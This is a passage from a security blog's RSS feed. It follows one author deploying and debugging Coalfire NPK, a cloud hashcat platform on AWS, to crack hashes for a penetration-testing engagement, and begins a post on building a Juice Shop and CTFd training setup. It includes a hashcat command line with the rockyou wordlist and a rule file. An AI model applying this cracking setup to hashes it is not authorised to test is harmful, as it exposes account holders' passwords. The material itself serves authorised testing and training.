+DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won't be maintained after that date. A future version of pip will drop support for Python 2.7.
+Collecting jsonnet
+  Downloading https://files.pythonhosted.org/packages/33/b8/a8588d4010f13716a324f55d23999259bad9db2320f4fe919a66b2f651f3/jsonnet-0.15.0.tar.gz (255kB)
+     |████████████████████████████████| 256kB 2.5MB/s 
+Building wheels for collected packages: jsonnet
+  Building wheel for jsonnet (setup.py) ... done
+  Stored in directory: /Users/doyler/Library/Caches/pip/wheels/57/63/2e/da89cfe1ba08550bd7262d5d9c027edc313980c3b85b3b0a38
+Successfully built jsonnet
+Installing collected packages: jsonnet
+Successfully installed jsonnet-0.15.0
+
+... &lt;snip&gt; ...
+
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk</span># brew install jq
+==&gt; Installing dependencies for jq: oniguruma
+==&gt; Installing jq dependency: oniguruma
+==&gt; Downloading https://homebrew.bintray.com/bottles/oniguruma-6.9.4.mojave.bottle.tar.gz
+==&gt; Downloading from https://akamai.bintray.com/ab/ab2bb92e40e17569c54dda0ed3b3a0fc6f98be761107fba918754af75817d
+######################################################################## 100.0%
+==&gt; Pouring oniguruma-6.9.4.mojave.bottle.tar.gz
+<img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f37a.png" alt="🍺" class="wp-smiley" style="height: 1em; max-height: 1em;" />  /usr/local/Cellar/oniguruma/6.9.4: 17 files, 1.3MB
+==&gt; Installing jq
+==&gt; Downloading https://homebrew.bintray.com/bottles/jq-1.6.mojave.bottle.1.tar.gz
+==&gt; Downloading from https://akamai.bintray.com/71/71f0e76c5b22e5088426c971d5e795fe67abee7af6c2c4ae0cf4c0eb98ed2
+######################################################################## 100.0%
+==&gt; Pouring jq-1.6.mojave.bottle.1.tar.gz
+<img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f37a.png" alt="🍺" class="wp-smiley" style="height: 1em; max-height: 1em;" />  /usr/local/Cellar/jq/1.6: 18 files, 1MB
+</pre>
+<p>I also needed to install the <a href="https://aws.amazon.com/cli/">AWS CLI</a>, which was simple enough.</p>
+<p>Finally, I installed <a href="https://www.terraform.io/downloads.html">Terraform</a>, and I was ready to go.</p>
+<h2>Coalfire NPK - Installation (and Hiccups)</h2>
+<p>With the prerequisites installed, I changed the npk-settings.json file.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># cp npk-settings.json.sample npk-settings.json
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># vi npk-settings.json
+</pre>
+<p>Next, I setup my AWS credential file. For a good example, I recommend the following <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-profiles.html">guide</a>.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># mkdir ~/.aws
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># vi ~/.aws/credentials
+</pre>
+<p>I verified my credential file and access with the 'iam get-user' AWS CLI command.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># aws --profile NPKuser iam get-user
+{
+    "User": {
+        "Path": "/",
+        "UserName": "NPKuser",
+        "UserId": "A...XJ",
+        "Arn": "arn:aws:iam::794951671079:user/NPKuser",
+        "CreateDate": "2020-02-19T18:38:15+00:00"
+    }
+}
+</pre>
+<p>With everything in place, I ran the deploy script. Unfortunately, I ran into some issues with attribute types.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># ./deploy.sh 
+[*] Preparing to deploy NPK.
+[*] Getting availabilityzones from AWS
+[*] - us-east-1
+[*] - us-east-2
+[*] - us-west-1
+[*] - us-west-2
+[*] Checking service-linked roles for EC2 spot fleets
+
+An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name AmazonEC2SpotFleetRole cannot be found.
+
+...
+
+Error: Incorrect attribute value type
+
+  on routetable.tf.json line 39, in resource.aws_route_table.us-west-2:
+  39:             "route": {
+  40:                "cidr_block": "0.0.0.0/0",
+  41:                "gateway_id": "${aws_internet_gateway.us-west-2.id}"
+  42:             },
+
+<span class="highlight">Inappropriate value for attribute "route": set of object required.</pre>
+<p>After looking through the <a href="https://github.com/Coalfire-Research/npk/issues/64">NPK issues</a>, this was due to my Terraform version.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># terraform --version
+Terraform v0.12.20
+</pre>
+<p>I removed the latest version, and installed v0.11.0.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># rm /usr/local/bin/terraform 
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># wget https://releases.hashicorp.com/terraform/0.11.0/terraform_0.11.0_darwin_amd64.zip
+--2020-02-19 13:44:27--  https://releases.hashicorp.com/terraform/0.11.0/terraform_0.11.0_darwin_amd64.zip
+Resolving releases.hashicorp.com (releases.hashicorp.com)... 151.101.129.183, 151.101.193.183, 151.101.1.183, ...
+Connecting to releases.hashicorp.com (releases.hashicorp.com)|151.101.129.183|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 15753806 (15M) [application/zip]
+Saving to: ‘terraform_0.11.0_darwin_amd64.zip’
+
+terraform_0.11.0_darwin_amd 100%[===========================================&gt;]  15.02M  28.8MB/s    in 0.5s    
+
+2020-02-19 13:44:28 (28.8 MB/s) - ‘terraform_0.11.0_darwin_amd64.zip’ saved [15753806/15753806]
+
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># unzip terraform_0.11.0_darwin_amd64.zip 
+Archive:  terraform_0.11.0_darwin_amd64.zip
+  inflating: terraform               
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># rm terraform_0.11.0_darwin_amd64.zip 
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># mv terraform /usr/local/bin/
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># terraform --version
+Terraform v0.11.0
+</pre>
+<p>This time, when I ran the deploy script, everything finished!</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># ./deploy.sh 
+[*] Preparing to deploy NPK.
+[*] Getting availabilityzones from AWS
+[*] - us-east-1
+[*] - us-east-2
+[*] - us-west-1
+[*] - us-west-2
+[*] Checking service-linked roles for EC2 spot fleets
+
+...
+
+<span class="highlight">Apply complete! Resources: 0 added, 2 changed, 0 destroyed.</span>
+
+Outputs:
+
+admin_create_user_command = aws --region us-west-2 --profile NPKuser cognito-idp admin-create-user --user-pool-id us-west-2_KF3XeeGEl --username redacted --user-attributes '[{"Name": "email", "Value": "redacted"}, {"Name": "email_verified", "Value": "true"}]' --temporary-password redacted
+admin_password = redacted
+cloudfront_url = d319eumg867kv9.cloudfront.net
+s3_static_site_sync_command = aws --profile NPKuser s3 --region us-west-2 sync /Users/doyler/tools/npk/terraform/../site-content/ s3://npk-site-content-20200219184518947700000007
+</pre>
+<p>I also had to subscribe to the <a href="https://aws.amazon.com/marketplace/pp/B07SL1B2HJ/">Amazon Linux AMI with NVIDIA TESLA GPU Driver<br />
+</a>, but that was simple enough.</p>
+<p>When I went to the Cloudfront URL, I saw the NPK login screen.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login-1024x611.png" alt="Coalfire NPK - Login" width="500" height="298" class="alignnone size-large wp-image-4978" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login-1024x611.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login-300x179.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login-768x459.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-1-login.png 1174w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<h2>First Cracking Attempt</h2>
+<p>When I logged in with the temporary password, I saw NPK dashboard.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-1024x235.png" alt="NPK dashboard" width="500" height="115" class="alignnone size-large wp-image-4979" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-1024x235.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-300x69.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-768x176.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-1536x352.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard-880x200.png 880w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-2-dashboard.png 1901w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>I setup a new campaign to try and crack the descrypt hashes for my engagement.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign-1024x388.png" alt="New campaign" width="500" height="189" class="alignnone size-large wp-image-4980" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign-1024x388.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign-300x114.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign-768x291.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-3-campaign.png 1464w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>When I tried to start this campaign, I received some blank error messages, and nothing seemed to start.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt-1024x124.png" alt="Coalfire NPK - Error message" width="500" height="61" class="alignnone size-large wp-image-4981" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt-1024x124.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt-300x36.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt-768x93.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt-1536x186.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-4-firstAttempt.png 1615w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<h2>Coalfire NPK - Debugging</h2>
+<p>When I looked at the campaign status, I saw an error about the service-linked role.</p>
+<pre class="console">
+Error: Error requesting spot fleet: AuthFailure.ServiceLinkedRoleCreationNotPermitted: The provided credentials do not have permission to create the service-linked role for EC2 Spot Fleet.
+</pre>
+<p>I found some <a href="https://doc.arvados.org/v1.4/admin/spot-instances.html">documentation</a> that indicated that my roles and permissions were incorrect.</p>
+<p>First, I tried to manually create the JSON with the AWSServiceRoleForEC2Spot role.</p>
+<pre class="console">
+{
+            "Sid": "8",
+            "Effect": "Allow",
+            "Action": [
+                "iam:CreateServiceLinkedRole",
+                "iam:PutRolePolicy"
+            ],
+            "Resource": "arn:aws:iam::*:role/aws-service-role/spot.amazonaws.com/AWSServiceRoleForEC2Spot",
+            "Condition": {
+                "StringLike": {
+                    "iam:AWSServiceName": "spot.amazonaws.com"
+                }
+            }
+        }
+</pre>
+<p>I changed the npk_lambda_api_handler_policy and npk_lambda_api_handler_role, as I wasn't sure which of these the error was coming from.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole-1024x455.png" alt="Execution role" width="500" height="222" class="alignnone size-large wp-image-4982" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole-1024x455.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole-300x133.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole-768x341.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-5-executionRole.png 1504w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Unfortunately, this was still still failing, after updating npk_fleet_role_policy as well.</p>
+<p>I created a <a href="https://github.com/Coalfire-Research/npk/issues/77">GitHub issue</a>, to try and get some help during my debugging process.</p>
+<p>First, it looked like my return code was 254 instead of 255, so I edited the deploy scripts for this case.</p>
+<pre class="console">
+$ aws --profile NPKuser iam get-role --role-name AmazonEC2SpotFleetRole
+
+An error occurred (NoSuchEntity) when calling the GetRole operation: The role with name AmazonEC2SpotFleetRole cannot be found.
+$ echo $?
+254
+</pre>
+<p>I ran the destroy command after changing the scripts, to ensure that everything was properly removed.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># terraform destroy
+There are warnings related to your configuration. If no errors occurred,
+Terraform will continue despite these warnings. It is a good idea to resolve
+these warnings in the near future.
+
+Warnings:
+
+  * aws_cognito_user_pool.npk: "admin_create_user_config.0.unused_account_validity_days": [DEPRECATED] Use password_policy.temporary_password_validity_days instead
+
+...
+
+aws_s3_bucket.static_site: Destruction complete after 3m49s
+
+Destroy complete! Resources: 127 destroyed.
+</pre>
+<p>When I ran the deploy script again, it looked like everything was again good to go.</p>
+<pre class="console">
+<span class="prompt">doyler@mbp</span>:<span class="dir">~/tools/npk/terraform</span># ./deploy.sh 
+[*] Preparing to deploy NPK.
+[*] Getting availabilityzones from AWS
+[*] - us-east-1
+[*] - us-east-2
+[*] - us-west-1
+[*] - us-west-2
+[*] Checking service-linked roles for EC2 spot fleets
+
+...
+
+<span class="highlight">Apply complete! Resources: 0 added, 2 changed, 0 destroyed.</span>
+
+Outputs: (redacted)
+</pre>
+<p>Unfortunately, I ended up with a ton of different AWS errors, due to destroy not removing everything properly.</p>
+<pre class="console">
+aws_cognito_user_pool.npk: Modifications complete after 6s (ID: us-west-2_I8pd6eQTI)
+
+Error: Error applying plan:
+
+4 error(s) occurred:
+
+* aws_key_pair.us-west-1: 1 error(s) occurred:
+
+* aws_key_pair.us-west-1: Error import KeyPair: InvalidKeyPair.Duplicate: The keypair 'npk-key' already exists.
+        status code: 400, request id: 864f0d74-f4e9-4d5b-bd0d-cda3bca377b0
+* aws_dynamodb_table.settings: 1 error(s) occurred:
+
+* aws_dynamodb_table.settings: error creating DynamoDB Table: ResourceInUseException: Table already exists: Settings
+* aws_subnet.us-west-2a: 1 error(s) occurred:
+
+* aws_subnet.us-west-2a: Error creating subnet: InvalidSubnet.Conflict: The CIDR '10.202.1.0/24' conflicts with another subnet
+        status code: 400, request id: 4d5f16da-1aa4-4dbf-81de-ac6d404c74e5
+* aws_dynamodb_table.campaigns: 1 error(s) occurred:
+
+* aws_dynamodb_table.campaigns: error creating DynamoDB Table: ResourceInUseException: Table already exists: Campaigns
+
+Terraform does not automatically rollback in the face of errors.
+Instead, your Terraform state file has been partially updated with
+any resources that successfully completed. Please address the error
+above and apply again to incrementally change your infrastructure.
+</pre>
+<p>Once I manually removed EVERYTHING, the deployment succeeded, and I no longer received these errors.</p>
+<h2>Second Attempt</h2>
+<p>With everything stood up again, I was able to successfully start a new campaign.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-6-success.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-6-success.png" alt="Campaign success" width="964" height="430" class="alignnone size-full wp-image-4983" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-6-success.png 964w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-6-success-300x134.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-6-success-768x343.png 768w" sizes="(max-width: 964px) 100vw, 964px" /></a></p>
+<p>Going to the campaign page, it showed the price increasing and the status as "RUNNING".</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-1024x183.png" alt="Coalfire NPK - Campaign running" width="500" height="89" class="alignnone size-large wp-image-4984" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-1024x183.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-300x54.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-768x137.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-1536x275.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-7-running-2048x366.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Unfortunately, this campaign ended quickly, and I did not crack the hash. When I took a look at the potfile, it seemed like hashcat wasn't really running.</p>
+<pre class="console">
+Credentials loaded
+[ '--quiet',
+  '-O',
+  '--remove',
+  '--potfile-path=/potfiles/i-0715e8ac226a8f026.potfile',
+  '-o',
+  '/potfiles/cracked_hashes-i-0715e8ac226a8f026.txt',
+  '-w',
+  '4',
+  '-m',
+  1500,
+  '-a',
+  0,
+  '-r',
+  '/root/npk-rules/NSAKEY.v2.dive.rule.txt',
+  '/root/hashes.txt',
+  '/root/npk-wordlist/rockyou.txt' ]
+Found status report in output
+[31mnvmlDeviceGetFanSpeed(): Not Supported[0m
+
+[31mnvmlDeviceGetFanSpeed(): Not Supported[0m
+
+[31mnvmlDeviceGetFanSpeed(): Not Supported[0m
+
+[31mnvmlDeviceGetFanSpeed(): Not Supported[0m
+
+[31mnvmlDeviceGetFanSpeed(): Not Supported[0m
+
+
+Caught error: TypeError: Cannot read property 'split' of undefined
+
+
+Died with code 255 and signal 0
+
+Dying words:
+</pre>
+<p>After looking at more <a href="https://github.com/Coalfire-Research/npk/issues/13">GitHub issues</a>, I realized that my hash file was improperly formatted.</p>
+<p>After fixing my hash file, everything was up and running properly.</p>
+<p>Note that I was still receiving errors upon starting a campaign, but these would go away immediately and not negatively affect anything.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-1024x327.png" alt="More errors" width="500" height="160" class="alignnone size-large wp-image-4985" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-1024x327.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-300x96.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-768x245.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-1536x490.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-8-moreErrors-2048x654.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-1024x94.png" alt="Campaign completed" width="500" height="46" class="alignnone size-large wp-image-4986" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-1024x94.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-300x27.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-768x70.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-1536x140.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-9-completed-2048x187.png 2048w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>Finally, the actual statistics while a campaign are running are neat, and cool enough to throw up on a dashboard or something similar.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics-1024x273.png" alt="Coalfire NPK - Statistics" width="500" height="133" class="alignnone size-large wp-image-4987" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics-1024x273.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics-300x80.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics-768x205.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics-1536x410.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-10-statistics.png 1902w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<h2>Coalfire NPK - Conclusion</h2>
+<p>While I was able to finally get everything working, I do not think that I will move forward with NPK.</p>
+<p>Everything was a bit difficult to setup, and it doesn't give any option for raw hashcat interaction.</p>
+<p>I was hoping to be able to add brute-force options, or more easily upload different rules/dictionaries.</p>
+<p>Finally, here is me trying to setup a mask manually, which obviously didn't work.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks.png"><img src="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks-1024x281.png" alt="Manual mask" width="500" height="137" class="alignnone size-large wp-image-4988" srcset="https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks-1024x281.png 1024w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks-300x82.png 300w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks-768x211.png 768w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks-1536x421.png 1536w, https://www.doyler.net/wp-content/uploads/coalfireNPK/coalfireNPK-11-masks.png 1932w" sizes="(max-width: 500px) 100vw, 500px" /></a></p>
+<p>If you have any suggestions for cloud cracking platforms or configuration, then please let me know!</p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/coalfire-npk">Coalfire NPK &#8211; Installation, Configuration, and Usage</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.doyler.net/security-not-included/coalfire-npk/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">4930</post-id>	</item>
+		<item>
+		<title>OWASP Juice Shop + CTFd = Easy DIY CTFs!</title>
+		<link>https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd</link>
+					<comments>https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd#respond</comments>
+		
+		<dc:creator><![CDATA[doyler]]></dc:creator>
+		<pubDate>Sat, 29 Feb 2020 17:00:02 +0000</pubDate>
+				<category><![CDATA[Security Not Included]]></category>
+		<guid isPermaLink="false">https://www.doyler.net/?p=4918</guid>
+
+					<description><![CDATA[<p>I recently setup OWASP Juice Shop + CTFd for some internal training/CTFs, and I wanted to share the process. OWASP Juice Shop - Introduction If you have never heard of Juice Shop, then I recommend you check out the OWASP &#8230; <a href="https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd">Continue reading <span class="meta-nav">&#8594;</span></a></p>
+<p>The post <a rel="nofollow" href="https://www.doyler.net/security-not-included/owasp-juice-shop-ctfd">OWASP Juice Shop + CTFd = Easy DIY CTFs!</a> appeared first on <a rel="nofollow" href="https://www.doyler.net">doyler.net</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I recently setup OWASP Juice Shop + CTFd for some internal training/CTFs, and I wanted to share the process.</p>
+<p><span id="more-4918"></span></p>
+<h2>OWASP Juice Shop - Introduction</h2>
+<p>If you have never heard of Juice Shop, then I recommend you check out the <a href="https://owasp.org/www-project-juice-shop/">OWASP project page</a>.</p>
+<p>There is also a useful <a href="https://github.com/bkimminich/juice-shop">GitHub repository</a> with some more documentation as well as Docker images.</p>
+<p>For more information on CTFd, you can go to their <a href="https://github.com/CTFd/CTFd">GitHub repository</a> as well.</p>
+<h2>AWS Configuration</h2>
+<p>First, I setup a new EC2 instance for my server.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-1-ec2.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-1-ec2.png" alt="OWASP Juice Shop - EC2 instance" width="215" height="261" class="alignnone size-full wp-image-4946" /></a></p>
+<p>I decided to go with an Ubuntu image in the t2.micro tier.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-2-freeUbuntu.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-2-freeUbuntu.png" alt="Ubuntu server" width="1017" height="100" class="alignnone size-full wp-image-4947" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-2-freeUbuntu.png 1017w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-2-freeUbuntu-300x29.png 300w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-2-freeUbuntu-768x76.png 768w" sizes="(max-width: 1017px) 100vw, 1017px" /></a></p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-3-micro.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-3-micro.png" alt="T2.micro" width="508" height="55" class="alignnone size-full wp-image-4948" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-3-micro.png 508w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-3-micro-300x32.png 300w" sizes="(max-width: 508px) 100vw, 508px" /></a></p>
+<p>When I finished my configuration, the instance was created and running.</p>
+<p><a href="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-4-instance.png"><img src="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-4-instance.png" alt="OWASP Juice Shop - Instance launched" width="565" height="167" class="alignnone size-full wp-image-4949" srcset="https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-4-instance.png 565w, https://www.doyler.net/wp-content/uploads/juiceShop/juiceShop-4-instance-300x89.png 300w" sizes="(max-width: 565px) 100vw, 565px" /></a></p>
+<h2>OWASP Juice Shop - Setup</h2>
+<p>With the EC2 instance up, it was time to connect to the server.</p>
+<pre class="console">
+<span class="prompt">root@kali</span>:<span class="dir">~/JuiceShop#</span> chmod 600 juiceshop-keypair.pem 
+<span class="prompt">root@kali</span>:<span class="dir">~/JuiceShop#</span> ssh -i juiceshop-keypair.pem root@ec2-xxx.compute.amazonaws.com
+Please login as the user "ubuntu" rather than the user "root".
+
+^CConnection to ec2-xxx.compute.amazonaws.com closed.
+<span class="prompt">root@kali</span>:<span class="dir">~/JuiceShop#</span> ssh -i juiceshop-keypair.pem ubuntu@ec2-xxx.compute.amazonaws.com
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-1057-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Feb 13 18:45:46 UTC 2020
+
+  System load:  0.25              Processes:           89
+  Usage of /:   13.8% of 7.69GB   Users logged in:     0
+  Memory usage: 15%               IP address for eth0: 172.x.x.x
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ 
+</pre>
+<p>First, I setup Docker on my new system. I'm not going to cover the installation process, but the following two links should be more than enough to get you started:</p>
+<ul>
+<li><a href="https://www.doyler.net/security-not-included/vulnreport-docker">https://www.doyler.net/security-not-included/vulnreport-docker</a></li>
+<li><a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-16-04</a></li>
+</ul>
+<p>Next, I verified that Docker was up and running.</p>
+<pre class="console">
+<span class="prompt">ubuntu@ip-172-x-x-x</span>:<span class="dir">~</span>$ sudo systemctl status docker
+● docker.service - Docker Application Container Engine
+   Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
+   Active: active (running) since Thu 2020-02-13 18:48:54 UTC; 11s ago
+     Docs: https://docs.docker.com
+ Main PID: 2989 (dockerd)
+    Tasks: 8
+   CGroup: /system.slice/docker.service
+           └─2989 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.312774297Z" level=warning msg="Your 
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.313013735Z" level=warning msg="Your 
+Feb 13 18:48:54 ip-172-x-x-x dockerd[2989]: time="2020-02-13T18:48:54.313158796Z" level=warning msg="Your 
